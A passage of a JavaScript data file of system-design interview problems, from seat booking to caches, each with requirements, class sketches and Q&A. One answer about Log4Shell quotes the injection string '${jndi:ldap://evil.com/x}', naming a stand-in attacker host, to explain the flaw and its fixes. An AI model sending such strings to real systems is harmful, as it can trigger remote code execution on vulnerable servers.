- **Option B — Optimistic DB**: UPDATE seats SET status='HELD', heldBy=?, expiresAt=NOW()+INTERVAL '5 min' WHERE showId=? AND seatId IN (...) AND status='AVAILABLE'; check rowsAffected == requestedCount
- **Option C — Pessimistic DB**: SELECT FOR UPDATE inside transaction

**Patterns:** State (seat states AVAILABLE → HELD → BOOKED → CANCELLED), Strategy (pricing: weekend/holiday surge), Observer (notify on hold expiry).`,
    crossQA: [
      { q: "How to prevent double-booking of a seat?",
        a: "Atomic reserve: UPDATE ... SET status='HELD' WHERE status='AVAILABLE'. If 0 rows affected, someone beat you. Don't SELECT then UPDATE — race condition window." },
      { q: "Distributed lock via Redis — how?",
        a: "SET seat:X:Y userId NX EX 300. NX = only if not exists. EX 300 = 5 min auto-expire. Release: Lua script that deletes only if value matches userId (prevents releasing someone else's lock)." },
      { q: "What if user holds seats but never pays?",
        a: "TTL on hold (5 min). Background job releases expired holds. Or lazy: on next hold attempt, check expiry." },
      { q: "How to handle 10M concurrent requests for Avengers premiere?",
        a: "Virtual waiting room: put all users in a queue, drip-feed them into the real booking flow at controlled rate. Browsing is read-only from CDN cache. Actual reservation is the bottleneck." },
      { q: "Seat layout — how to model?",
        a: "Per screen, 2D grid. Some seats are unavailable (aisle blockers). Categories zoned by rows. Front-end renders from JSON. API returns layout + current state (available/booked)." },
      { q: "Partial cancellation?",
        a: "Allow canceling some seats from a booking. Prorate refund. Re-issue available state on those seats. Edge: if show has started, no refund (policy)." },
      { q: "Fraud: scraping seat inventory?",
        a: "Rate limit per IP/user. CAPTCHA on suspicious. Bots try to race in for premium seats. Track pattern: X requests across shows in 10s = likely bot." },
    ],
  },
  {
    n: "Food Ordering System", track: "be", d: "Medium", t: "60-90 min",
    p: "Strategy (delivery assignment), Observer (status), State (order)",
    r: "Browse menu, Cart management, Place order, Track delivery, Rating, Order status updates",
    eval: "State machine for orders, Strategy pattern, Extensibility",
    c: "Swiggy, Zomato, Startups",
    desc: "Food delivery: browse restaurants/menus, add to cart, place order, restaurant prepares, delivery agent assigned, order tracked end-to-end.",
    requirements: [
      "Restaurants, Menus, Dishes (with attributes: veg/non-veg, cuisine, price)",
      "Cart: add/remove, quantity, taxes, fees",
      "Place order: create Order, charge, notify restaurant",
      "Order states: PLACED → CONFIRMED → PREPARING → READY → OUT_FOR_DELIVERY → DELIVERED (+ CANCELLED)",
      "Delivery assignment: find nearest available agent",
      "Real-time status updates to user",
      "Rating after delivery",
    ],
    classes: `**Entities:**
- Restaurant, Menu, Dish, Cart, Order, OrderItem, DeliveryAgent, Address
- OrderStateMachine — transitions allowed per state
- AssignmentStrategy (Strategy) — NearestAgent, LeastBusy
- NotificationService (Observer) — on state change, notify user + restaurant + agent

**Flow:**
1. Cart.placeOrder() → Order (PLACED)
2. Payment succeeds → CONFIRMED
3. Restaurant accepts → PREPARING
4. Restaurant says ready → READY → Assignment finds agent → OUT_FOR_DELIVERY
5. Agent delivers → DELIVERED

**Patterns:** State (order), Strategy (assignment, pricing), Observer (status broadcast).`,
    crossQA: [
      { q: "What if restaurant rejects order?",
        a: "Order → REJECTED state. Refund automatic. Notify user. Suggest alternates. Track restaurant reject rate — flag if high." },
      { q: "How to match delivery agent?",
        a: "Nearest available within 2km radius. If none, expand radius. If still none, warn restaurant 'delivery may be delayed'. Multi-order batching for efficiency (one agent delivers multiple orders on route)." },
      { q: "Late delivery handling?",
        a: "SLA: 45 min from order. If exceeded: partial refund auto-applied, apology notification, track restaurant metric. Repeated late → flag restaurant." },
      { q: "Real-time tracking — how?",
        a: "Agent's phone sends GPS every 10s to backend. Backend WebSocket to user's browser. User sees moving pin. Battery concern: reduce frequency if user's screen locked." },
      { q: "Surge pricing (rainy day)?",
        a: "Dynamic delivery fee based on demand/supply. Communicated clearly to user before order. Transparent reason ('high demand')." },
      { q: "Cancellation flow?",
        a: "Allowed until PREPARING. After: not allowed (food already being made). Exception: restaurant takes >15min to accept → auto-cancel with full refund." },
    ],
  },
  {
    n: "Logging Framework (Log4j-like)", track: "be", d: "Medium", t: "45-60 min",
    p: "Singleton (Logger), Strategy (appender), Chain of Responsibility (log level)",
    r: "Log levels (DEBUG-FATAL), Multiple appenders, Formatting, Async logging, Log rotation",
    eval: "Thread safety, Performance, Extensibility, Singleton pattern",
    c: "Amazon, Google, Atlassian",
    desc: "Log4j-like logging framework: log levels (DEBUG/INFO/WARN/ERROR/FATAL), multiple appenders (Console/File/Network), configurable format, async logging, log rotation.",
    requirements: [
      "Log levels: DEBUG, INFO, WARN, ERROR, FATAL",
      "Logger.info(msg), Logger.error(msg, exception)",
      "Filter by level (only log >= configured level)",
      "Multiple appenders: Console, File, Network",
      "Per-appender format (pattern: '%date %level %msg')",
      "Async mode (non-blocking for caller)",
      "File rotation (by size or date)",
      "Thread-safe",
    ],
    classes: `**Core:**
- Logger (singleton per category) — name, level, appenders[]
  - log(level, msg, args) — if level >= this.level, dispatch to appenders
- Appender (interface) — append(LogEvent)
  - ConsoleAppender, FileAppender (with rotation), NetworkAppender
- LogFormatter (Strategy) — format(LogEvent)→String
  - PatternFormatter, JsonFormatter
- AsyncAppender — wraps any appender, uses bounded queue + worker thread

**Patterns:** Singleton (global Logger), Strategy (Formatter), Chain of Responsibility (level filters).`,
    crossQA: [
      { q: "Why async logging?",
        a: "Logging has disk I/O latency. Sync logging blocks the caller thread. Async: enqueue log event, worker thread flushes. Caller returns immediately. But bounded queue — if overwhelmed, drop or block." },
      { q: "Thread safety?",
        a: "Logger state is read-mostly — volatile fields enough. Appender.append() must be thread-safe if async. Use ConcurrentLinkedQueue or LMAX Disruptor for the async queue." },
      { q: "File rotation strategy?",
        a: "Size-based: when file > 100MB, rename to app.log.1, start fresh. Keep N archives. Date-based: rotate at midnight, append date to archive name. Both can coexist." },
      { q: "What about logging in a shutdown hook?",
        a: "Async logging + JVM shutdown = lost messages. Register shutdown hook that flushes queue before exit. Or use synchronous appender for critical logs." },
      { q: "How do log4j remote JNDI vulnerabilities (Log4Shell) happen?",
        a: "log4j parsed '${...}' patterns in user-provided messages, fetched remote content via JNDI. Malicious input like '${jndi:ldap://evil.com/x}' caused remote code execution. Lessons: (1) never interpolate user input in log messages — log with parameters not string concat. (2) disable risky features by default." },
      { q: "Structured logging — why?",
        a: "Plain text: grepping, regex parsing, painful. Structured JSON: queryable, aggregatable (ELK, Splunk). Log with context: user_id, request_id, duration_ms — each as a field. Makes observability orders of magnitude better." },
    ],
  },
  {
    n: "Chess Game", track: "be", d: "Hard", t: "90 min",
    p: "Strategy (move validation), State (game), Factory (piece)",
    r: "Piece movement rules, Check/Checkmate detection, Castling, En passant, Move history, Undo",
    eval: "Polymorphism for pieces, Move validation, Game state",
    c: "Google, Amazon, Flipkart",
    desc: "Full chess game engine: piece movement (with special moves — castling, en passant, promotion), check/checkmate detection, move history, undo, move validation.",
    requirements: [
      "8x8 board, initial setup",
      "Pieces: King, Queen, Rook, Bishop, Knight, Pawn",
      "Validate moves per piece rules",
      "Check detection (is own king under attack after move?)",
      "Checkmate, stalemate",
      "Special moves: castling (king/queen side), en passant, pawn promotion",
      "Move history, undo move",
      "Algebraic notation (e4, Nf3, O-O)",
    ],
    classes: `**Piece hierarchy:**
- Piece (abstract) — color, position, abstract validMoves(board)→Set<Position>
  - Pawn, Rook, Bishop, Knight, Queen (Rook+Bishop), King
- Board — grid, pieces, history, currentPlayer
- Move — from, to, piece, capturedPiece?, isCastle, isEnPassant, promotion?
- Game — board, whitePlayer, blackPlayer, play()
- MoveValidator — validates move legality (move pattern + no self-check)

**Key complexities:**
- After pseudo-legal move, verify own king NOT in check (simulate move, test, revert)
- Castling: king + rook haven't moved, no squares between attacked, king not in check
- En passant: only on immediate next move after opponent pawn double-steps adjacent
- Promotion: auto-Queen or user-chosen

**Patterns:** Polymorphism (each Piece implements validMoves), State (game state), Factory (create piece by type/color), Command (Move, for undo).`,
    crossQA: [
      { q: "How to detect checkmate?",
        a: "King in check AND no legal move escapes it. For each own piece, for each candidate move, simulate + test if still in check. If no move leaves king safe → checkmate. Performance: check-escape heuristics (can king move? can we block? can we capture attacker?)." },
      { q: "How to detect stalemate?",
        a: "Not in check AND no legal move exists. Same iteration, different condition." },
      { q: "Undo implementation?",
        a: "Move class stores full info to revert: piece moved, captured piece, old position, castling rook if applicable, en passant state, promotion. Reverse all." },
      { q: "Board representation — 2D array vs bitboards?",
        a: "2D array: clear, simple, fine for single-game engine. Bitboards (one 64-bit int per piece type): 10-100x faster for engines like Stockfish. Overkill for interview unless asked." },
      { q: "How to implement a chess AI?",
        a: "Minimax with alpha-beta pruning + eval function (material + positional scores + king safety). Depth 6-8 decent. Modern engines: neural net evaluation + MCTS (AlphaZero). Massive topic — we could spend weeks." },
      { q: "Algebraic notation parsing?",
        a: "Complex. 'Nf3' = Knight to f3. 'Nbd2' = knight from b-file. 'exd5' = pawn captures at d5. 'O-O' = kingside castle. Grammar is non-trivial. Use library or implement step by step for interview." },
    ],
  },
  {
    n: "Pub/Sub Messaging System", track: "be", d: "Hard", t: "60-90 min",
    p: "Observer, Strategy (delivery), Singleton (broker)",
    r: "Create topics, Publish/Subscribe, Message ordering, At-least-once delivery, Dead letter queue",
    eval: "Thread safety, Message ordering guarantees, Scalability",
    c: "Amazon, Flipkart, PhonePe",
    desc: "Message broker like Kafka-lite or RabbitMQ-lite. Topics, publishers, consumers (with consumer groups), message ordering, at-least-once delivery, DLQ.",
    requirements: [
      "Create/delete topic",
      "Publish message to topic",
      "Subscribe consumer to topic (with optional consumer group)",
      "Per-partition ordering (Kafka-style)",
      "Consumer group: each msg delivered to one consumer in group",
      "Offset tracking per consumer group",
      "At-least-once delivery (retry until ack)",
      "DLQ for poison messages (after N fails)",
      "Thread-safe",
    ],
    classes: `**Core:**
- Broker (singleton) — Map<topicName, Topic>
- Topic — name, partitions[], retentionPolicy
- Partition — ordered list of Message + index
- Message — id, payload, timestamp, headers
- Producer — publish(topic, key, payload) → partition chosen by hash(key)
- ConsumerGroup — name, offsets per partition, assigned consumers
- Consumer — poll() → batch; commit(offset)

**Delivery:**
- Push: broker sends to consumer (needs flow control)
- Pull: consumer polls (simpler, backpressure built-in) — Kafka does this

**Patterns:** Observer (topic → subscribers), Strategy (delivery semantics: at-most-once, at-least-once, exactly-once), Singleton (Broker).`,
    crossQA: [
      { q: "Why partitioning?",
        a: "Parallelism. Multiple partitions per topic allow multiple consumers in group to process in parallel. Ordering only within partition. Key = hash(userId) → same user's messages go to same partition → ordered for that user." },
      { q: "At-least-once vs exactly-once?",
        a: "At-least-once: consumer can process + crash before committing offset → redelivery. Consumer must be idempotent. Exactly-once: requires distributed transaction or idempotent consumer with dedup. Kafka supports EOS mode (transactional producer + transactional consumer)." },
      { q: "Consumer group rebalancing?",
        a: "When consumer joins/leaves, partitions redistributed. During rebalance, no messages consumed. Problem for long-running consumers — hence the short session.timeout.ms tuning." },
      { q: "Message retention?",
        a: "Kafka keeps messages for configured time (e.g., 7 days) even after consumed. New consumer groups can replay. Contrast with RabbitMQ: deletes on ack." },
      { q: "How to implement DLQ?",
        a: "Consumer retries N times on failure. On exhaustion: publish to {topic}.dlq. Manual inspection. Poison messages don't block the queue. Separate job retries DLQ messages periodically." },
      { q: "Back-pressure — what if consumers can't keep up?",
        a: "Pull model: consumer polls at own pace — natural backpressure. Push model: broker must buffer or drop. Alert on lag (broker position - consumer offset)." },
      { q: "Scaling to 1M msg/sec?",
        a: "More partitions (parallelism). More brokers (cluster). Disk-sequential writes (Kafka is fast due to page cache + sendfile syscall). Compression at producer. Avoid small messages — batch." },
    ],
  },
  {
    n: "File System (In-Memory)", track: "be", d: "Hard", t: "60-90 min",
    p: "Composite (file/dir tree), Iterator, Visitor",
    r: "Create/Delete file/dir, Move, Copy, Search (by name/ext/size), ls with filters, Permission check",
    eval: "Composite pattern, Tree traversal, Search implementation",
    c: "Google, Amazon, Microsoft",
    desc: "In-memory file system: create/delete files and directories, move, copy, search by various criteria, list directory contents, permission checks.",
    requirements: [
      "Create file/directory (with absolute path)",
      "Delete (rm, rmdir)",
      "Move (mv)",
      "Copy (cp, cp -r)",
      "List directory (ls, ls -la)",
      "Read/write file content",
      "Search: by name (glob), by extension, by size range, by modified time",
      "Permissions: read/write/execute per owner/group/other (Unix-like)",
      "Symbolic links (bonus)",
    ],
    classes: `**Composite:**
- FSNode (abstract) — name, parent, permissions, createdAt, modifiedAt, owner
  - File extends FSNode — content: String/bytes, size
  - Directory extends FSNode — children: Map<String, FSNode>

**FileSystem:**
- root: Directory
- resolvePath(path) → FSNode
- touch(path), mkdir(path), rm(path), mv(src, dst), cp(src, dst)
- ls(path, filter?) — list directory
- find(path, predicate) — Visitor pattern traversal
- read(path), write(path, content)

**Patterns:** Composite (File + Directory with same interface), Iterator (DFS/BFS over tree), Visitor (search predicates), Command (operations for undo).`,
    crossQA: [
      { q: "How to handle path resolution (relative, `..`, `.`)?",
        a: "Split by '/'. Resolve segment by segment from current or root. '..' = go to parent. '.' = stay. '~' = home. Resolve symlinks iteratively (with loop detection). This is what `os.path.resolve` does." },
      { q: "Rename/move efficient?",
        a: "If within same parent: rename in map — O(1). Across directories: remove from old parent's map, add to new — O(1). Cross-mount: actual copy (data). Hard links special-cased." },
      { q: "Copy semantics (deep or shallow)?",
        a: "File copy: duplicate content. Directory copy -r: recurse, creating new structure. Symlink: copy the link target (or the link itself, `cp -P`). Defaults: cp file copies content; cp -r dir recurses." },
      { q: "How to search efficiently?",
        a: "For name-based: trie indexed by filename — O(name length). For content search: inverted index (like Elasticsearch). In-memory fs small enough that BFS/DFS linear is fine for most cases." },
      { q: "Concurrent access?",
        a: "Readers-writers lock per directory. Read: multiple readers ok. Write: exclusive. Or optimistic: generation counter on dir, retry if changed during op." },
      { q: "Permission model?",
        a: "Each node has (owner, group, mode). Mode = rwxrwxrwx bits (9 bits). Check per op: read/write/execute applies to the intended access. Execute on dir = ability to enter/traverse." },
      { q: "Persistence?",
        a: "Not in-memory anymore — serialize tree to disk. Journal each operation for crash recovery. Or snapshot + WAL (write-ahead log). Real filesystems are significantly more complex (inodes, blocks, metadata journal)." },
    ],
  },
  {
    n: "Inventory Management", track: "be", d: "Medium", t: "60-90 min",
    p: "Observer (stock alerts), Strategy (allocation), State (order)",
    r: "Add/Remove stock, Order fulfillment, Low stock alerts, Multi-warehouse, FIFO/LIFO allocation",
    eval: "Concurrent stock updates, Allocation strategy, Reporting",
    c: "Amazon, Flipkart, Meesho",
    desc: "Inventory system across multiple warehouses: track stock, allocate for orders, low-stock alerts, FIFO/LIFO allocation for perishables, transfer between warehouses.",
    requirements: [
      "Products with SKUs",
      "Multiple warehouses",
      "Stock in/out per warehouse",
      "Reserve stock for order (hold)",
      "Confirm reservation (commit) or release",
      "Low-stock alerts (threshold-based)",
      "Transfer between warehouses",
      "FIFO/LIFO allocation for perishable goods",
      "Reports: current stock, in-transit, reserved",
    ],
    classes: `**Entities:**
- Product (sku, name, unit)
- Warehouse (id, location, address)
- Stock (productId, warehouseId, quantity, reserved, batches: [{expiry, qty}])
- StockMovement (productId, warehouseId, type: IN/OUT/TRANSFER/RESERVE/RELEASE, qty, timestamp)
- AllocationStrategy (Strategy) — allocate(order, availableStock)
  - FIFO, LIFO, NearestWarehouse, LeastCost
- AlertService (Observer) — notify on threshold breach

**Patterns:** Observer (low stock alerts), Strategy (allocation), State (order: PENDING → RESERVED → FULFILLED → CANCELLED), Command (movements as auditable events).`,
    crossQA: [
      { q: "How to handle concurrent reservations?",
        a: "Transaction: SELECT FOR UPDATE on stock row, check available > requested, UPDATE reserved+=qty, commit. Or optimistic with version column. Redis lock pre-DB is fast path for hot items." },
      { q: "FIFO for perishables — how?",
        a: "Track batches per SKU+warehouse with expiry. Allocate oldest batch first. When batch exhausted, move to next. Helps food, pharma avoid waste." },
      { q: "Oversubscription (negative stock)?",
        a: "Strict: never negative — block reservation. Flexible: allow with backorder status. Black Friday approach: oversell by known % based on historical cancellation rate." },
      { q: "Multi-warehouse allocation?",
        a: "Strategy: prefer nearest to delivery address. Fallback: split order across warehouses (multi-parcel). Transfer cost: may be cheaper to ship from farther if closer is low-stock." },
      { q: "How to track stock across scale?",
        a: "Eventual consistency across warehouses. Central aggregate view is slightly stale. For reservations: use owning warehouse's authoritative count. Kafka for cross-system event propagation." },
      { q: "Reconciliation (physical count vs system)?",
        a: "Periodic physical audit. System flags discrepancies. Adjust with audit trail — not overwrite. Investigate large discrepancies (theft, misreads)." },
    ],
  },
  {
    n: "ATM Machine", track: "be", d: "Medium", t: "45-60 min",
    p: "State (ATM states), Chain of Responsibility (cash), Strategy (auth)",
    r: "Insert card, PIN validation, Balance check, Withdraw (denomination optimization), Receipt, Deposit",
    eval: "State machine, Denomination handling, Transaction atomicity",
    c: "Amazon, Banks, TCS",
    desc: "ATM state machine: insert card, authenticate, perform operations (balance, withdraw, deposit, transfer), dispense cash with optimal denomination, print receipt.",
    requirements: [
      "States: IDLE → CARD_INSERTED → AUTHENTICATED → OPERATION_SELECTED → PROCESSING → DONE → IDLE",
      "Insert card → prompt PIN → validate (3 tries, then block)",
      "Operations: Balance, Withdraw, Deposit, Transfer, Change PIN",
      "Withdraw: ensure denomination availability (mix of ₹100/200/500/2000)",
      "Print receipt (optional)",
      "Timeout in any state → return card",
      "Transaction atomicity: debit + dispense must be all-or-nothing",
    ],
    classes: `**State Machine (State pattern):**
IdleState → CardInsertedState (on insert) → AuthenticatedState (on PIN ok) → ...

Each State handles events, transitions self.

**Denomination strategy:**
Given amount X and available denominations (2000, 500, 200, 100), compute minimum notes:
- Greedy: start with largest. Works for standard Indian currency.
- For arbitrary denominations: DP (unbounded knapsack for min coins).
- Also check availability of each denomination at this ATM.

**Transaction atomicity:**
- Reserve cash in ATM
- Call bank service to debit account
- If debit succeeds → dispense → log success
- If debit fails → release reservation
- If debit succeeds but dispense fails → reverse debit, alert operations

**Patterns:** State (ATM states), Chain of Responsibility (try denominations in order), Strategy (auth: card+PIN, OTP, biometric).`,
    crossQA: [
      { q: "How to handle network timeout mid-withdrawal?",
        a: "Idempotency key per transaction. Retry with same key → bank recognizes and returns same result. Never debit twice. If uncertain state, reconciliation job resolves later." },
      { q: "How to handle cash dispenser jam?",
        a: "Hardware signals 'jammed'. Mark transaction as DISPENSE_FAILED. Reverse bank debit. Alert operations for maintenance. Lock ATM if multiple jams." },
      { q: "Why denomination optimization?",
        a: "Customer wants fewest notes. Also minimizes ATM refill frequency. Constraint: some denominations may be low — use what's available." },
      { q: "Security concerns?",
        a: "PIN never stored — hash. Card reader encrypted. Skimming: detect tampering via chassis sensors. Suspicious: multiple wrong PINs, rapid repeated withdrawals → lock card, alert bank." },
      { q: "Timeout handling?",
        a: "Each state has timer. No input in 30s → auto return card. Prevents forgotten cards. 'Are you still there?' prompt at 20s, then timeout at 30s." },
      { q: "Offline mode?",
        a: "Limited ops — display last cached balance, accept deposits (no live credit), small withdrawals against cached balance. Sync later. Risks bank acceptance." },
    ],
  },
  {
    n: "Meeting Scheduler", track: "be", d: "Medium", t: "60-90 min",
    p: "Strategy (room selection), Observer (notifications)",
    r: "Book meeting, Check availability, Recurring meetings, Conflict resolution, Room suggestions, Notifications",
    eval: "Interval overlap detection, Recurring event handling",
    c: "Google, Atlassian, Microsoft",
    desc: "Meeting scheduler like Google Calendar: book meetings, check attendee availability, recurring meetings, room booking, conflict detection, notifications.",
    requirements: [
      "User calendars with events",
      "Book meeting: attendees[], duration, preferred times",
      "Availability check across attendees",
      "Suggest times with all-attendee availability",
      "Book a room (if requested) — nearest available with capacity",
      "Recurring meetings: weekly, biweekly, monthly, custom (cron)",
      "Notifications: invite, reminder, changes",
      "Conflict handling: warn or prevent double-booking",
    ],
    classes: `**Entities:**
- User, Room (capacity, equipment, building, floor)
- Event (title, start, end, organizer, attendees, roomId?, recurrence?)
- Recurrence (type: NONE/DAILY/WEEKLY/MONTHLY/CUSTOM_CRON, until?, exceptions[])
- Calendar — events for a user
- Availability — intervals of free time for user over range

**Operations:**
- findAvailableSlots(attendees, duration, range) → [{start, end}]
  - Merge busy intervals per attendee → invert → intersect across attendees
- bookRoom(event, criteria: capacity, location) → Room?
- sendInvitations(event) → email/calendar protocol (iCal)

**Patterns:** Strategy (room selection), Observer (notifications), Iterator (expand recurring events in range).`,
    crossQA: [
      { q: "How to find common free time for N attendees?",
        a: "For each attendee, get busy intervals in range. Union. Invert to get free intervals. Intersect across all attendees. Slide duration-sized window. Return first match (or all matches, sorted)." },
      { q: "Recurring events — how to store?",
        a: "Don't store every instance. Store rule (RRULE: FREQ=WEEKLY;UNTIL=...) + exceptions (EXDATE) + overrides. Expand on-the-fly for date range queries. iCal RFC 5545 is the standard." },
      { q: "Timezone handling?",
        a: "Store UTC in DB. Store organizer's timezone alongside. Render in attendee's timezone. Recurring meetings across DST boundaries shift by an hour if not handled — store in original timezone and convert per instance." },
      { q: "Double-booking prevention?",
        a: "Unique constraint: (userId, start, end) can't overlap. SELECT ... WHERE overlap exists, block. Better UX: allow but show conflict indicator, let user decide." },
      { q: "Calendar sync with Google/Outlook?",
        a: "OAuth + CalDAV or native APIs. Webhooks for real-time updates. Two-way sync is hard — conflicts resolved by last-write-wins or user choice." },
      { q: "How to handle 'find a time with 50 people'?",
        a: "Naive intersection is O(N × events). Optimize: skip people with solid 9-5 busy blocks, suggest earliest gap. If none: suggest times where 80% available + warn." },
    ],
  },
  {
    n: "LRU + LFU Cache", track: "be", d: "Hard", t: "45-60 min",
    p: "Strategy (eviction), Template Method",
    r: "GET/PUT O(1), LRU eviction, LFU eviction, TTL support, Size-bounded, Cache statistics",
    eval: "O(1) operations, Correct eviction, Thread safety",
    c: "All companies",
    desc: "Cache with pluggable eviction (LRU or LFU), O(1) get/put, TTL, size-bounded, statistics (hit rate, evictions).",
    requirements: [
      "get(key), put(key, value, ttl?)",
      "O(1) for get and put",
      "LRU: evict least-recently-used on full",
      "LFU: evict least-frequently-used",
      "TTL per entry (optional)",
      "Stats: hits, misses, evictions, size",
      "Thread-safe",
    ],
    classes: `**LRU (HashMap + Doubly Linked List):**
\`\`\`
class LRUCache {
  capacity;
  map = new Map();  // key → node
  head, tail;       // sentinels, DLL

  get(key) {
    if (!map.has(key)) return null;
    const node = map.get(key);
    moveToHead(node);
    return node.value;
  }
  put(key, value) {
    if (map.has(key)) { node.value = value; moveToHead(node); return; }
    const node = { key, value };
    map.set(key, node);
    addToHead(node);
    if (map.size > capacity) {
      const tail = removeTail();
      map.delete(tail.key);
    }
  }
}
\`\`\`

**LFU (HashMap + FreqMap):**
- map: key → node (with freq)
- freqMap: freq → DLL of nodes at that freq
- minFreq tracker
- get: freq++, move node to next freq list
- put full: remove from freqMap[minFreq].tail

**Patterns:** Strategy (eviction — LRU/LFU interchangeable), Template Method (get/put skeleton, eviction hook).`,
    crossQA: [
      { q: "Why DLL, not array, for LRU?",
        a: "Array: remove from middle is O(n). DLL: O(1) given node ref. HashMap gives us node ref, so move + delete are O(1). Array would defeat the constant-time requirement." },
      { q: "LFU tie-breaker?",
        a: "Multiple keys at same freq. Default: evict least recently used among them (LFU+LRU hybrid). Maintain DLL at each freq level. Tail of minFreq's DLL is victim." },
      { q: "TTL implementation?",
        a: "Each entry has expiryAt. Lazy: check on get — if expired, remove + miss. Active: periodic scan removes expired (sample random subset to bound work)." },
      { q: "Thread safety — lock granularity?",
        a: "Whole-cache lock: simple, serializes ops. Striped lock: hash key → pick from N locks. ConcurrentHashMap + per-entry lock. Or CAS on counter/DLL — complex." },
      { q: "What about distributed cache?",
        a: "Consistent hashing across nodes. Each key lives on one node. Client-side routing by key hash. Node failure: neighbor takes over key range (replicas for HA). See Redis Cluster, Memcached." },
      { q: "Cache stampede?",
        a: "Hot key expires → many concurrent misses → DB overload. Solutions: (1) Single-flight: one request fetches, others wait. (2) Probabilistic early refresh. (3) Stale-while-revalidate: return stale, refresh async." },
      { q: "Cache-aside vs write-through vs write-behind?",
        a: "Cache-aside (most common): app reads cache, miss → read DB + populate cache; writes go to DB, invalidate cache. Write-through: app writes to both simultaneously. Write-behind: write cache first, async flush to DB (risk: data loss)." },
    ],
  },
];

// Merge + assign ids
export const MACHINE_CODING = [
  ...FE_MC.map((x, i) => ({ ...x, id: `mcfe-${i}` })),
  ...BE_MC.map((x, i) => ({ ...x, id: `mcbe-${i}` })),
];
